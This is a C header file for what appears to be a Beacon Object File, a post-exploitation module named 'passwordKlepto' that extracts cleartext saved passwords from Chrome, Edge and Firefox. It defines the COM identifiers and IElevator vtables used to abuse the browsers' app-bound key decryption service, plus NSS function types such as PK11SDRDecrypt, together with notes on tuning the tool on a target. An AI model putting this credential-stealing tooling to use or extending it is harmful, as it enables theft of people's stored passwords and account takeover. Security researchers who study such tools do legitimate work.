/*
 * passwordKlepto.h — local structs / typedefs for the in-process cleartext
 * browser-password BOF (Chrome/Edge v10+v20, Firefox NSS).
 *
 * BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO / BCRYPT_* handle types come from
 * <bcrypt.h> pulled in via ../_include/bofdefs.h — do NOT redefine them.
 */
#pragma once

/* ---- small byte buffer ------------------------------------------------ */
typedef struct {
    unsigned char *data;
    size_t         len;
} Buffer;

/* ---- IElevator COM (app-bound v20 key) — copied from cookie-monster-bof.h */
const CLSID Chrome_CLSID_Elevator = { 0x708860E0, 0xF641, 0x4611, {0x88, 0x95, 0x7D, 0x86, 0x7D, 0xD3, 0x67, 0x5B} };
const IID   Chrome_IID_IElevator    = { 0x463ABECF, 0x410D, 0x407F, {0x8A, 0xF5, 0x0D, 0xF3, 0x5A, 0x00, 0x5C, 0xC8} };
const IID   Chrome_IID_IElevator2   = { 0x1BF5208B, 0x295F, 0x4992, {0xB5, 0xF4, 0x3A, 0x9B, 0xB6, 0x49, 0x48, 0x38} };
const CLSID Edge_CLSID_Elevator   = { 0x1FCBE96C, 0x1697, 0x43AF, {0x91, 0x40, 0x28, 0x97, 0xC7, 0xC6, 0x97, 0x67} };
const IID   Edge_IID_IElevator      = { 0xC9C2B807, 0x7731, 0x4F34, {0x81, 0xB7, 0x44, 0xFF, 0x77, 0x79, 0x52, 0x2B} };

typedef enum {
    PROTECTION_NONE = 0,
    PROTECTION_PATH_VALIDATION_OLD = 1,
    PROTECTION_PATH_VALIDATION = 2,
    PROTECTION_MAX = 3
} ProtectionLevel;

typedef struct IElevatorEdge IElevatorEdge;
typedef struct IElevatorEdgeVtbl {
    HRESULT (STDMETHODCALLTYPE *QueryInterface)(IElevatorEdge*, REFIID, void**);
    ULONG   (STDMETHODCALLTYPE *AddRef)(IElevatorEdge*);
    ULONG   (STDMETHODCALLTYPE *Release)(IElevatorEdge*);
    HRESULT (STDMETHODCALLTYPE *ReservedFunction1)(IElevatorEdge*);
    HRESULT (STDMETHODCALLTYPE *LaunchUpdateCmdElevated)(IElevatorEdge*, LPWSTR, LPWSTR, unsigned long, ULONG_PTR*);
    HRESULT (STDMETHODCALLTYPE *LaunchUpdateCmdElevatedAndWait)(IElevatorEdge*, LPWSTR, LPWSTR, unsigned long, unsigned long*);
    HRESULT (STDMETHODCALLTYPE *RunRecoveryCRXElevated)(IElevatorEdge*, WCHAR*, WCHAR*, WCHAR*, WCHAR*, unsigned long, ULONG_PTR*);
    HRESULT (STDMETHODCALLTYPE *EncryptData)(IElevatorEdge*, ProtectionLevel, BSTR, BSTR*, unsigned long*);
    HRESULT (STDMETHODCALLTYPE *DecryptData)(IElevatorEdge*, BSTR, BSTR*, unsigned long*);
    HRESULT (STDMETHODCALLTYPE *InstallVPNServices)(IElevatorEdge*);
} IElevatorEdgeVtbl;
struct IElevatorEdge { IElevatorEdgeVtbl *lpVtbl; };

typedef struct IElevatorChrome IElevatorChrome;
typedef struct IElevatorChromeVtbl {
    HRESULT (STDMETHODCALLTYPE *QueryInterface)(IElevatorChrome*, REFIID, void**);
    ULONG   (STDMETHODCALLTYPE *AddRef)(IElevatorChrome*);
    ULONG   (STDMETHODCALLTYPE *Release)(IElevatorChrome*);
    HRESULT (STDMETHODCALLTYPE *RunRecoveryCRXElevated)(IElevatorChrome*, WCHAR*, WCHAR*, WCHAR*, WCHAR*, unsigned long, ULONG_PTR*);
    HRESULT (STDMETHODCALLTYPE *EncryptData)(IElevatorChrome*, ProtectionLevel, BSTR, BSTR*, unsigned long*);
    HRESULT (STDMETHODCALLTYPE *DecryptData)(IElevatorChrome*, BSTR, BSTR*, unsigned long*);
    HRESULT (STDMETHODCALLTYPE *InstallVPNServices)(IElevatorChrome*);
} IElevatorChromeVtbl;
struct IElevatorChrome { IElevatorChromeVtbl *lpVtbl; };

/* APPB prefix on the app_bound_encrypted_key */
static const uint8_t kCryptAppBoundKeyPrefix[] = { 'A','P','P','B' };

/* ---- NSS (Firefox) ---------------------------------------------------- */
typedef int SECStatus;
typedef enum { siBuffer = 0, siClearDataBuffer, siCipherDataBuffer, siDERCertBuffer,
               siEncodedCertBuffer, siNameBuffer, siCertNameBuffer } SECItemType;

/* SECItem layout is ABI-critical and arch-sensitive (pointer width). The
 * canonical nss secitem.h: { SECItemType type; unsigned char *data; unsigned int len; }
 * — on x64 this is 24 bytes (4+pad4+8+4+pad4), on x86 12 bytes. sizeof() is
 * used at runtime so we just let the compiler lay it out naturally.
 * ON-TARGET-TUNING: if PK11SDRDecrypt returns garbage, double-check packing. */
typedef struct {
    SECItemType      type;
    unsigned char   *data;
    unsigned int     len;
} SECItem;

typedef SECStatus (*PFN_NSS_Init)(const char *configdir);
typedef SECStatus (*PFN_NSS_Shutdown)(void);
typedef void     *(*PFN_PK11_GetInternalKeySlot)(void);
typedef void      (*PFN_PK11_FreeSlot)(void *slot);
typedef SECStatus (*PFN_PK11_Authenticate)(void *slot, int loadCerts, void *wincx);
/* PK11SDRDecrypt(SECItem *data, SECItem *result, void *cx) -> SECStatus */
typedef SECStatus (*PFN_PK11SDRDecrypt)(SECItem *data, SECItem *result, void *cx);
typedef SECStatus (*PFN_SECITEM_FreeItem)(SECItem *item, int freeit);